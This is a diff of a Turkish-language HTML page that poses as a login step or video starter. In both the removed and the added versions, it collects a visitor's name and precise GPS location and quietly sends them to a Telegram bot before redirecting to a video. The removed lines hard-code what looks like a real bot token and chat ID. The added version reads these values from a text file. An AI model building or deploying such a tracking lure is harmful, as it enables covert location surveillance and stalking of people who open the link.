@@ -2,74 +2,43 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Video Başlatılıyor...</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding-top: 60px;
-    }
-    input, button {
-      padding: 10px;
-      margin: 10px;
-      width: 250px;
-      font-size: 16px;
-    }
-    #durum {
-      color: green;
-      height: 1.5em;
-    }
-  </style>
+  <title>Giriş Sayfası</title>
 </head>
 <body>
-
-  <h2>Giriş yapın</h2>
-  <input id="isim" placeholder="Adınız">
-  <br>
-  <button onclick="devam()">Devam Et</button>
-  <p id="durum"></p>
+  <h2>Giriş Yap</h2>
+  <input type="text" id="username" placeholder="Adınızı girin">
+  <button onclick="girisYap()">Giriş Yap</button>
 
   <script>
-    const BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
-    const CHAT_ID = "8499614707";
-    const YOUTUBE_URL = "https://www.youtube.com/watch?v=PCMJtCjfxpw";
-
-    function arkadaGonder(isim, konum) {
-      const mesaj = `🧑 Ad: ${isim}\n📍 Konum: https://maps.google.com?q=${konum.lat},${konum.lon}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: mesaj })
-      });
-    }
-
-    function devam() {
-      const isim = document.getElementById("isim").value.trim();
-      const durum = document.getElementById("durum");
-
-      if (!isim) {
-        durum.style.color = "red";
-        durum.textContent = "Lütfen adınızı girin.";
+    async function girisYap() {
+      const name = document.getElementById("username").value;
+      if (!name) {
+        alert("Lütfen adınızı girin!");
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(pos => {
-        const konum = {
-          lat: pos.coords.latitude.toFixed(6),
-          lon: pos.coords.longitude.toFixed(6)
-        };
+      if (!navigator.geolocation) {
+        alert("Tarayıcınız konum izni desteklemiyor.");
+        return;
+      }
 
-        arkadaGonder(isim, konum);
-        durum.textContent = "Video başlatılıyor...";
-        setTimeout(() => {
-          window.location.href = YOUTUBE_URL;
-        }, 1500);
-      }, err => {
-        durum.style.color = "red";
-        durum.textContent = "Konum alınamadı: " + err.message;
+      navigator.geolocation.getCurrentPosition(async function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        // bilgiler.txt dosyasını oku
+        const response = await fetch("bilgiler.txt");
+        const text = await response.text();
+        const botToken = text.match(/BOT_TOKEN=(.*)/)[1].trim();
+        const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+
+        const message = `👤 İsim: ${name}\n📍 Konum: https://www.google.com/maps?q=${lat},${lon}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        await fetch(url);
+        window.location.href = "-videouzantıkoy-"; // buraya videoyu sen koyacaksın
       });
     }
   </script>
-
 </body>
 </html>
